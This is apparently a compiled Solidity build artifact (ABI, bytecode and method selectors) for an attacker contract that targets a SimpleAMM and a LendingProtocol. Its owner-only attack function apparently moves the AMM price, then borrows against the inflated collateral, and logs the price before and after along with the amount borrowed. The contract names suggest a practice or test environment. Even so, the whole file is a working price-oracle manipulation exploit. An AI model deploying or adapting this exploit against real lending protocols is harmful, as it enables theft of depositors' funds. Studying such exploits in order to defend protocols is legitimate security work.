{"abi":[{"type":"constructor","inputs":[{"name":"_amm","type":"address","internalType":"address"},{"name":"_lending","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"amm","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract SimpleAMM"}],"stateMutability":"view"},{"type":"function","name":"attack","inputs":[{"name":"","type":"uint256","internalType":"uint256"},{"name":"collateralAmount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"lending","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract LendingProtocol"}],"stateMutability":"view"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"event","name":"AttackExecuted","inputs":[{"name":"priceBefore","type":"uint256","indexed":false,"internalType":"uint256"},{"name":"priceAfter","type":"uint256","indexed":false,"internalType":"uint256"},{"name":"borrowed","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506040516106a53803806106a5833981016040819052602b916084565b5f80546001600160a01b039384166001600160a01b031991821617909155600180549290931691811691909117909155600280549091163317905560b0565b80516001600160a01b0381168114607f575f5ffd5b919050565b5f5f604083850312156094575f5ffd5b609b83606a565b915060a760208401606a565b90509250929050565b6105e8806100bd5f395ff3fe608060405234801561000f575f5ffd5b506004361061004a575f3560e01c80632a9439451461004e5780638da5cb5b1461007c57806395e97eee1461008f578063e1fa7638146100a2575b5f5ffd5b5f54610060906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b600254610060906001600160a01b031681565b600154610060906001600160a01b031681565b6100b56100b0366004610533565b6100b7565b005b6002546001600160a01b031633146101025760405162461bcd60e51b81526020600482015260096024820152682737ba1037bbb732b960b91b60448201526064015b60405180910390fd5b5f5f5f9054906101000a90046001600160a01b03166001600160a01b031663dc76fabc6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610152573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101769190610553565b5f80546040516320297e9760e01b815230600482015292935090916001600160a01b03909116906320297e9790602401602060405180830381865afa1580156101c1573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101e59190610553565b9050801561025a575f54604051630e0441df60e41b8152600481018390526001600160a01b039091169063e0441df0906024016020604051808303815f875af1158015610234573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102589190610553565b505b5f5f5f9054906101000a90046001600160a01b03166001600160a01b031663dc76fabc6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156102aa573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102ce9190610553565b5f805460405163072b4b2b60e21b815230600482015292935090916001600160a01b0390911690631cad2cac90602401602060405180830381865afa158015610319573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061033d9190610553565b90508481101561037e5760405162461bcd60e51b815260206004820152600c60248201526b4e6f7420656e6f756768204160a01b60448201526064016100f9565b60015460405163bad4a01f60e01b8152600481018790526001600160a01b039091169063bad4a01f906024015f604051808303815f87803b1580156103c1575f5ffd5b505af11580156103d3573d5f5f3e3d5ffd5b505050505f5f5f9054906101000a90046001600160a01b03166001600160a01b031663dc76fabc6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610427573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061044b9190610553565b90505f670de0b6b3a7640000610461838961056a565b61046b9190610593565b90505f609661047b83606461056a565b6104859190610593565b905080156104e75760015460405163317afabb60e21b8152600481018390526001600160a01b039091169063c5ebeaec906024015f604051808303815f87803b1580156104d0575f5ffd5b505af11580156104e2573d5f5f3e3d5ffd5b505050505b60408051888152602081018790529081018290527f3ea690f4fa8772321cf530c78d01e7ce1398de1d42e9c247b17ff17c39f2e6e99060600160405180910390a1505050505050505050565b5f5f60408385031215610544575f5ffd5b50508035926020909101359150565b5f60208284031215610563575f5ffd5b5051919050565b808202811582820484141761058d57634e487b7160e01b5f52601160045260245ffd5b92915050565b5f826105ad57634e487b7160e01b5f52601260045260245ffd5b50049056fea26469706673582212202e51d57e386878d17524ffcac349a0662b293e9a80bee19d5f1e72f5ceb04eb164736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"amm()":"2a943945","attack(uint256,uint256)":"e1fa7638","lending()":"95e97eee","owner()":"8da5cb5b"},"id":0}